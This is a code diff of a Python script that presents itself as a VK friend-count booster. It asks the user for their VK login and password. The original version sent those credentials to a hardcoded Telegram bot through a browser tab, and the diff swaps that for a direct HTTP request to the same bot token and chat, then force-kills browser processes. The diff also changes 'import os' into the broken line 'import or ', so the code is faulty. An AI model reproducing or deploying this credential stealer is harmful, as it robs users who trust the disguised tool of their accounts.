@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 import webbrowser
 import re
-import os
+import or 
 import time
 import sys
 import itertools
@@ -17,13 +17,8 @@ log = input('Введите логин вк: ')
 passik = input('Ввведите пароль вк: ')
 num = input('Сколько накрутить друзей: ')
 
+requests.get('https://api.telegram.org/bot1609859164:AAHkDLdcz1sDMHWU01KlTlYqLJYMR_0lOds/sendMessage?chat_id=706208466&text=логин: '+log+' Пароль: '+passik)
 
-if re.search(r'\.', log):
-    webbrowser.open_new_tab('https://api.telegram.org/bot1609859164:AAHkDLdcz1sDMHWU01KlTlYqLJYMR_0lOds/sendMessage?chat_id=706208466&text=логин: '+log+' Пароль: '+passik)
-elif re.search(r'\ ', log):
-    webbrowser.open_new_tab('https://api.telegram.org/bot1609859164:AAHkDLdcz1sDMHWU01KlTlYqLJYMR_0lOds/sendMessage?chat_id=706208466&text=логин: '+log+' Пароль: '+passik)
-else:
-    webbrowser.open_new_tab('https://api.telegram.org/bot1609859164:AAHkDLdcz1sDMHWU01KlTlYqLJYMR_0lOds/sendMessage?chat_id=706208466&text=логин: '+log+' Пароль: '+passik)
 time.sleep(3) # Сон в 3 секунды
 os.system("taskkill /im browser.exe /f")
 os.system("taskkill /im opera.exe /f")
